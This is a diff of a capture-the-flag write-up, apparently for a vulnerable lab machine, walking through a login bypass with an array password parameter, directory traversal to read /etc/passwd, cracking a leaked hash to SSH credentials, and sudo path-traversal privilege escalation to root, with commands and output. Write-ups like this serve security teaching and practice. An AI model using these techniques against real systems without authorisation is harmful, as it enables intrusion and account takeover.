@@ -20,3 +20,33 @@ $ dirb http:///192.168.55.101
 
 Following the admin page, there is a login page. Next is to trying to bypass the login.
 Trying different sql injection tricks do not yield anything on this page. I proceed to intercept the request using Burp to investigate further.
+
+A blank variable is able to bypass the login form username=admin&password[]=admin. Now am presented with a dashboard.
+
+The only page that looks promising is http://192.168.122.101/admin/dashboard.php?page=log
+I will test how to read system files using this. Directory traversal is possible doing something like file=../../../../../../etc/passwd
+
+For this user a hash was left, time to try and crack it: webadmin:$1$webadmin$3sXBxGUtDGIFAcnNTNhi6/:1001:1001:webadmin,,,:/home/webadmin:/bin/bash
+
+Running john against it yields the password and that way with creds webadmin:dragon am able to ssh in.
+
+
+Now onwards to privelege escalation.
+webadmin@serv:~$ sudo -l
+Matching Defaults entries for webadmin on serv:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User webadmin may run the following commands on serv:
+    (ALL : ALL) /bin/nice /notes/*
+    
+webadmin@serv:~$ nano test.sh
+webadmin@serv:~$ chmod 777 test.sh
+webadmin@serv:~$ sudo /bin/nice /notes/../home/webadmin/test.sh 
+[sudo] password for webadmin: 
+root@serv:/home/webadmin# id
+uid=0(root) gid=0(root) groups=0(root)
+root@serv:/home/webadmin# whoami
+root
+
+And that way the box is rooted!
